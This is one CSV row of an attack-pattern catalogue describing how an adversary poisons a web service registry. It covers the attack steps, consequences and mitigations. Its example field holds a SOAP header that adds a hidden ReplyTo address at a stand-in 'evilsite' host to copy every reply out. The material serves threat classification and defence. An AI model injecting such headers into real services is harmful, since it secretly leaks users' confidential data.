ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes
51,Poison Web Service Registry,Detailed,Draft,"SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata, and delete information about service provider interfaces.",,High,Very High,::NATURE:ChildOf:CAPEC ID:203::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find a target SOA or Web Service] The adversary must first indentify a target SOA or Web Service.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine desired outcome] Because poisoning a web service registry can have different outcomes, the adversary must decide how they wish to effect the webservice.:TECHNIQUE:An adversary can perform a denial of service attack on a web service.:TECHNIQUE:An adversary can redirect requests or responses to a malicious service.::STEP:3:PHASE:Experiment:DESCRIPTION:[Determine if a malicious service needs to be created] If the adversary wishes to redirect requests or responses, they will need to create a malicious service to redirect to.:TECHNIQUE:Create a service to that requests are sent to in addition to the legitimate service and simply record the requests.:TECHNIQUE:Create a service that will give malicious responses to a service provider.:TECHNIQUE:Act as a malicious service provider and respond to requests in an arbitrary way.::STEP:4:PHASE:Exploit:DESCRIPTION:[Poison Web Service Registry] Based on the desired outcome, poison the web service registry. This is done by altering the data at rest in the registry or uploading malicious content by spoofing a service provider.:TECHNIQUE:Intercept and change WS-Adressing headers to route to a malicious service or service provider.:TECHNIQUE:Provide incorrect information in schema or metadata to cause a denial of service.:TECHNIQUE:Delete information about service procider interfaces to cause a denial of service.::",::The attacker must be able to write to resources or redirect access to the service registry.::,::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::,::Capability to directly or indirectly modify registry resources::,,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::,::Design: Enforce principle of least privilege::Design: Harden registry server and file access permissions::Implementation: Implement communications to and from the registry using secure protocols::,"::WS-Addressing provides location and metadata about the service endpoints. An extremely hard to detect attack is an attacker who updates the WS-Addressing header, leaves the standard service request and service provider addressing and header information intact, but adds an additional WS-Addressing Replyto header. In this case the attacker is able to send a copy (like a cc in mail) of every result the service provider generates. So every query to the bank account service, would generate a reply message of the transaction status to both the authorized service requester and an attacker service. This would be extremely hard to detect at runtime. <S:Header><wsa:MessageID>http://example.com/Message </wsa:MessageID><wsa:ReplyTo><wsa:Address>http://valid.example/validClient</wsa:Address> </wsa:ReplyTo><wsa:ReplyTo><wsa:Address>http://evilsite/evilClient</wsa:Address> </wsa:ReplyTo><wsa:FaultTo><wsa:Address>http://validfaults.example/ErrorHandler</wsa:Address> </wsa:FaultTo> </S:Header> In this example evilsite is an additional reply to address with full access to all the messages that the authorized (validClient) has access to. Since this is registered with ReplyTo header it will not generate a Soap fault.::",::285::74::693::,,,
